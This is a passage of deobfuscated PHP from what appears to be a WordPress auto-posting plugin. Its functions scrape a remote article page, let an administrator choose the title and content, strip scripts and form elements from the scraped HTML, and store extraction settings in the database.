			$_var_805 = substr($_var_805, strlen($_var_792[$_var_18]));
		} else {
			$_var_792[$_var_18] = $_var_805;
		}
	}
	return $_var_792;
}
function getPartsProtectedChars($_var_792, $_var_789, $_var_793)
{
	$_var_794 = array();
	for ($_var_18 = 0; $_var_18 < $_var_789; $_var_18++) {
		$_var_794[$_var_18] = array();
		foreach ($_var_793 as $_var_806) {
			if (!(stripos($_var_792[$_var_18], $_var_806) === false)) {
				$_var_794[$_var_18][] = $_var_806;
			}
		}
	}
	return $_var_794;
}
function autosetSettingsDisplay($_var_22, $_var_100)
{
	$_var_246 = getConfig($_var_22);
	global $_var_178;
	$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
	$_var_207 = null;
	$_var_208 = null;
	if ($_var_246['7daa67631524d79fc5fd69e84ba8aa5c'] != null && $_var_246['7daa67631524d79fc5fd69e84ba8aa5c'] != '') {
		$_var_559 = json_decode($_var_246['7daa67631524d79fc5fd69e84ba8aa5c'], TRUE);
		if ($_var_559['mode'] == 1) {
			$_var_208 = get_cookie_jar_ap($_var_559['url'], $_var_559['para']);
		} else {
			$_var_207 = $_var_559['cookie'];
		}
	}
	if ($_var_246['3ffc99c206d98be48c6f2e49177d75a9'] == '0') {
		$_var_1 = get_html_string_ap($_var_100, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
		$_var_2 = getHtmlCharset($_var_1);
		$_var_807 = str_get_html_ap($_var_1, $_var_2);
	} else {
		$_var_2 = $_var_246['3ffc99c206d98be48c6f2e49177d75a9'];
		$_var_807 = file_get_html_ap($_var_100, $_var_2, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
	}
	if ($_var_807 == NULL) {
		echo '<div class=' . '"' . 'error' . '"' . '><p>';
		echo __('Unable to open URL', 'wp-autopost') . ' : ' . $_var_100;
		echo '</p></div>';
		return;
	}
	$_var_808 = $_var_807->find('h1');
	$_var_809 = $_var_807->find('h2');
	$_var_810 = $_var_807->find('h3');
	if ($_var_808 == null && $_var_809 == null && $_var_810 == null) {
		echo '<div class=' . '"' . 'error' . '"' . '><p><code>' . $_var_100 . '</code></p><p><span class="red">';
		echo __('Unable to automatic find the title of article, you need to set by yourself', 'wp-autopost');
		echo '</span></p></div>';
		$_var_807->clear();
		unset($_var_807);
		return;
	}
	$_var_811 = $_var_807->find('p');
	if ($_var_811 == null || $_var_811 == '') {
		echo '<div class=' . '"' . 'error' . '"' . '><p><code>' . $_var_100 . '</code></p><p><span class="red">';
		echo __('Unable to automatic find the content of article, you need to set by yourself', 'wp-autopost');
		echo '</span></p></div>';
		$_var_807->clear();
		unset($_var_807);
		return;
	}
	unset($_var_811);
	$_var_25 = autoGetContents($_var_807, $_var_2);
	$_var_293 = getBaseUrl($_var_807, $_var_100);
	$_var_25 = transImgSrc($_var_25, $_var_293, $_var_100, '', $_var_246['c3465f8487c1b3ec391e29a48cf695bc']);
	if (!(stripos($_var_100, '#') === false)) {
		$_var_100 = substr($_var_100, 0, stripos($_var_100, '#'));
	}
	$_var_812 = substr($_var_100, 0, strrpos($_var_100, '/'));
	$_var_813 = substr($_var_100, strrpos($_var_100, '/'));
	if (!(stripos($_var_813, '.') === false)) {
		$_var_813 = substr($_var_813, 0, strrpos($_var_813, '.'));
	}
	if (!(stripos($_var_813, '_') === false)) {
		$_var_813 = substr($_var_813, 0, strrpos($_var_813, '_'));
	}
	if (!(stripos($_var_813, '-') === false)) {
		$_var_813 = substr($_var_813, 0, strrpos($_var_813, '-'));
	}
	$_var_814 = $_var_812 . $_var_813;
	$_var_815 = $_var_807->find('a');
	if ($_var_815 != null) {
		$_var_815 = array_reverse($_var_815);
		foreach ($_var_815 as $_var_244) {
			$_var_360 = $_var_244->href;
			if ($_var_360 != null && $_var_360 != '') {
				if (!(stripos($_var_360, 'http') === 0)) {
					$_var_360 = getAbsUrl($_var_360, $_var_293, $_var_100);
				}
				if (!(stripos($_var_360, '#') === false)) {
					$_var_360 = substr($_var_360, 0, stripos($_var_360, '#'));
				}
				if (strlen($_var_360) - strlen($_var_100) > 16) {
					continue;
				}
				if (stripos($_var_360, $_var_814) === 0 && $_var_360 != $_var_100) {
					$_var_816 = $_var_244->parent();
					$_var_816->innertext = '(*)';
					$_var_817 = $_var_816->outertext;
					break;
				}
			}
		}
	}
	echo '<div class=' . '"' . 'updated fade' . '"' . '>';
	echo '<form id="autoSetForm" method="post" action="admin.php?page=wp-autopost-pro/wp-autopost-tasklist.php">';
	echo '<input type="hidden" name="saction" value="autoSetTitle">';
	echo '<input type="hidden" name="selector" id="selector" value="">';
	echo '<input type="hidden" name="selector_index" id="selector_index" value="">';
	echo '<input type="hidden" name="id"  value="' . $_var_22 . '">';
	echo '<h3>' . __('Please select the Title of Article from the following list', 'wp-autopost') . ':</h3><code>' . $_var_100 . '</code><p></p><hr/>';
	if ($_var_808 != null) {
		$_var_372 = 0;
		foreach ($_var_808 as $_var_818) {
			$_var_255 = $_var_818->plaintext;
			if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
				$_var_255 = iconv($_var_2, 'UTF-8//IGNORE', $_var_255);
			}
			echo '<table><tr><td><span  class="auto-set-select" onclick="autoSetTitle(\'h1\',' . $_var_372 . ')">' . __('Select This Title', 'wp-autopost') . '</span></td>';
			echo '<td>' . $_var_255 . '</td></tr></table><br/>';
			$_var_372++;
		}
	}
	if ($_var_809 != null) {
		$_var_372 = 0;
		foreach ($_var_809 as $_var_819) {
			$_var_255 = $_var_819->plaintext;
			if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
				$_var_255 = iconv($_var_2, 'UTF-8//IGNORE', $_var_255);
			}
			echo '<table><tr><td><span  class="auto-set-select" onclick="autoSetTitle(\'h2\',' . $_var_372 . ')">' . __('Select This Title', 'wp-autopost') . '</span></td>';
			echo '<td>' . $_var_255 . '</td></tr></table><br/>';
			$_var_372++;
		}
	}
	if ($_var_810 != null) {
		$_var_372 = 0;
		foreach ($_var_810 as $_var_820) {
			$_var_255 = $_var_820->plaintext;
			if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
				$_var_255 = iconv($_var_2, 'UTF-8//IGNORE', $_var_255);
			}
			echo '<table><tr><td><span  class="auto-set-select" onclick="autoSetTitle(\'h3\',' . $_var_372 . ')">' . __('Select This Title', 'wp-autopost') . '</span></td>';
			echo '<td>' . $_var_255 . '</td></tr></table><br/>';
			$_var_372++;
		}
	}
	echo '<hr/>';
	echo '<br/><b>' . __('Post Content', 'wp-autopost') . ':</b>';
	if (isset($_var_817)) {
		echo ' <code>' . __('Paginated Contents has been detected', 'wp-autopost') . '</code> ';
		echo '<input type="hidden" name="pageAutoRules"  value="1">';
		$_var_821 = array();
		$_var_821[0] = 1;
		$_var_821[1] = stripslashes(trim($_var_817));
		global $wpdb, $t_ap_config;
		$wpdb->query($wpdb->prepare("update {$t_ap_config} set\n               page_selector = %s \n               WHERE id = %d", json_encode($_var_821), $_var_22));
	}
	echo '<input type="hidden" id="ap_content_s" value="0">';
	echo '<a href="javascript:;" onclick="showHTML()" >[ HTML ]</a><br/>';
	echo '<div id="ap_content">' . $_var_25 . '</div>';
	echo '<textarea id="ap_content_html" style="display:none;" >' . $_var_25 . '</textarea>';
	if (isset($_var_817)) {
		@ob_flush();
		flush();
	}
	echo '</form>';
	echo '</div>';
	$_var_807->clear();
	unset($_var_807);
}
function autoGetContents($_var_807, $_var_2)
{
	$_var_811 = $_var_807->find('p');
	$_var_822 = 0;
	$_var_823 = 0;
	$_var_824 = 0;
	$_var_825 = 0;
	$_var_826 = '';
	foreach ($_var_811 as $_var_10) {
		$_var_525 = $_var_10->parent();
		$_var_827 = str_replace(' ', '', $_var_525->plaintext);
		$_var_827 = str_replace("\r\n", ' ', $_var_827);
		$_var_827 = str_replace("\n", ' ', $_var_827);
		$_var_827 = str_replace('	', ' ', $_var_827);
		if ($_var_826 != $_var_827) {
			$_var_828 = $_var_525->find('img');
			$_var_829 = 0;
			if ($_var_828 != null) {
				foreach ($_var_828 as $_var_830) {
					$_var_831 = 150;
					$_var_832 = $_var_830->getAttribute('width');
					if ($_var_832 != null && $_var_832 != '') {
						$_var_832 = intval($_var_832);
						if ($_var_832 > 255) {
							$_var_831 = $_var_832;
						}
						if ($_var_832 < 255) {
							$_var_831 = $_var_831 / 2;
						}
					}
					$_var_829 = $_var_829 + $_var_831;
				}
			}
			$_var_826 = $_var_827;
			$_var_824 = strlen($_var_827) + $_var_829;
		}
		if ($_var_824 > $_var_823) {
			$_var_823 = $_var_824;
			$_var_822 = $_var_825;
		}
		$_var_825++;
	}
	unset($_var_826);
	unset($_var_833);
	$_var_416 = $_var_811[$_var_822];
	$_var_25 = '';
	if ($_var_811 != null) {
		$_var_834 = $_var_416->prev_sibling();
	}
	while ($_var_834 != null) {
		$_var_25 = $_var_834->outertext . $_var_25;
		$_var_834 = $_var_834->prev_sibling();
	}
	$_var_25 .= $_var_416->outertext;
	if ($_var_811 != null) {
		$_var_835 = $_var_416->next_sibling();
	}
	while ($_var_835 != null) {
		$_var_25 .= $_var_835->outertext;
		$_var_835 = $_var_835->next_sibling();
	}
	if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
		$_var_25 = iconv($_var_2, 'UTF-8//IGNORE', $_var_25);
	}
	$_var_387 = false;
	if (!(strpos($_var_25, 'script') === false)) {
		if (!$_var_387) {
			$_var_3 = str_get_html_ap($_var_25);
			$_var_387 = true;
		}
		$_var_836 = $_var_3->find('script');
		if ($_var_836 != null) {
			foreach ($_var_836 as $_var_837) {
				$_var_837->outertext = '';
			}
		}
	}
	if (!(strpos($_var_25, 'form') === false)) {
		if (!$_var_387) {
			$_var_3 = str_get_html_ap($_var_25);
			$_var_387 = true;
		}
		$_var_836 = $_var_3->find('form');
		if ($_var_836 != null) {
			foreach ($_var_836 as $_var_837) {
				$_var_837->outertext = '';
			}
		}
	}
	if (!(strpos($_var_25, 'input') === false)) {
		if (!$_var_387) {
			$_var_3 = str_get_html_ap($_var_25);
			$_var_387 = true;
		}
		$_var_836 = $_var_3->find('input');
		if ($_var_836 != null) {
			foreach ($_var_836 as $_var_837) {
				$_var_837->outertext = '';
			}
		}
	}
	if (!(strpos($_var_25, 'textarea') === false)) {
		if (!$_var_387) {
			$_var_3 = str_get_html_ap($_var_25);
			$_var_387 = true;
		}
		$_var_836 = $_var_3->find('textarea');
		if ($_var_836 != null) {
			foreach ($_var_836 as $_var_837) {
				$_var_837->outertext = '';
			}
		}
	}
	if ($_var_387) {
		$_var_25 = $_var_3->save();
		$_var_3->clear();
		unset($_var_3);
	}
	return $_var_25;
}
function autoSetTtile($_var_22, $_var_838, $_var_372, $_var_839)
{
	global $wpdb, $t_ap_config;
	$_var_583 = array();
	$_var_583[] = $_var_838;
	$_var_583[] = $_var_372;
	if ($_var_839 == 1 || $_var_839 == '1') {
		$_var_840 = 1;
	} else {
		$_var_840 = 0;
	}
	$wpdb->query($wpdb->prepare("update {$t_ap_config} set\n               auto_set = %s,\n\t\t\t   fecth_paged = %d \n               WHERE id = %d", json_encode($_var_583), $_var_840, $_var_22));
	echo '<div class=' . '"' . 'updated fade' . '"' . '>';
	echo '<p>' . __('[Article Extraction Settings] is automatically set OK', 'wp-autopost') . '</p>';
	echo '</div>';
}
function cancelautoset($_var_22)
{
	global $wpdb, $t_ap_config;
	$wpdb->query($wpdb->prepare("update {$t_ap_config} set\n               auto_set = %s \n               WHERE id = %d", '', $_var_22));
}
